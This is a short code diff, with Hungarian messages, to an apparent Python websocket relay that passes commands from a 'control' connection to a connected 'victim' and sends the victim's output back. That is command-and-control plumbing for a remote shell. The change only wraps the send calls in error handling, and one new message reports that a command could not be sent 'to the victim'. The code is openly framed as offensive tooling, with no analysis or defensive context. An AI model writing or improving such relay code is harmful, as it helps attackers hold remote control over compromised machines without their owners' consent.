@@ -55,7 +55,11 @@ def victim(ws):
         while True:
             msg = ws.receive()
             if msg is None: break
-            if controller_ws: controller_ws.send(msg)
+            if controller_ws: 
+                try:
+                    controller_ws.send(msg)
+                except:
+                    pass
     finally:
         victim_ws = None
 
@@ -68,7 +72,10 @@ def control(ws):
             cmd = ws.receive()
             if cmd is None: break
             if victim_ws:
-                victim_ws.send(cmd)
+                try:
+                    victim_ws.send(cmd)
+                except:
+                    ws.send("[-] Hiba: Nem sikerült elküldeni a parancsot az áldozatnak.")
             else:
                 ws.send("[-] Nincs csatlakozott áldozat!")
     finally:
